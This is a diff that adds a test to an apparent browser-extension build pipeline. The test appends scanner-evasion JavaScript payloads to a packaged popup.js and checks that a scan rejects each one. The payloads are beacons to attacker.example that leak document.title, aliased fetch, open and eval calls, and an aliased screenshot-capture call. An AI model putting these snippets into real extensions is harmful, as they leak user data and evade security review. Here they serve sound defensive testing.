@@ -337,6 +337,37 @@ describe('deterministic production-disabled candidate pipeline', () => {
     cleanRelease();
   });
 
+  it('rejects reviewed scanner-evasion payloads injected into packaged JavaScript', () => {
+    expectOk(runBuild('production-disabled'), 'build for evasion matrix');
+    expectOk(runBuild('synthetic-development'), 'synthetic build for evasion matrix');
+    cleanRelease();
+    const popupLeaf = resolve(distRoot, 'popup.js');
+    const pristine = readFileSync(popupLeaf);
+    const payloads: Array<[string, string]> = [
+      ['window.open("https://attacker.example/?d="+document.title);', 'network-deny'],
+      ['const _f=fetch;_f("https://attacker.example/");', 'network-deny'],
+      ['(0,eval)("1+1");', 'javascript-authority-closure'],
+      ['globalThis["eval"]("1+1");', 'javascript-authority-closure'],
+      ['new Image().src="https://attacker.example/b";', 'network-deny'],
+      ['const _t=chrome.tabs;_t.captureVisibleTab();', 'chrome-api-allowlist'],
+      ['const _u="https://attacker.example/bare-url";', 'network-deny'],
+      ['const _o=open;_o("https://attacker.example/");', 'network-deny'],
+    ];
+    try {
+      for (const [payload, expectedCheck] of payloads) {
+        writeFileSync(popupLeaf, Buffer.concat([pristine, Buffer.from(payload)]));
+        const result = runScript('scan');
+        expect(result.status, `payload must fail: ${payload}`).not.toBe(0);
+        expect(`${result.stdout}\n${result.stderr}`, payload).toContain(expectedCheck);
+        expect(`${result.stdout}\n${result.stderr}`, 'no raw payload echo').not.toContain('attacker.example');
+      }
+    } finally {
+      writeFileSync(popupLeaf, pristine);
+    }
+    expectOk(runScript('scan'), 'pristine scan green after evasion matrix');
+    cleanRelease();
+  });
+
   it('keeps the packaged source strictly the production-disabled family', () => {
     expectOk(runBuild('production-disabled'), 'build for family scan');
     cleanRelease();
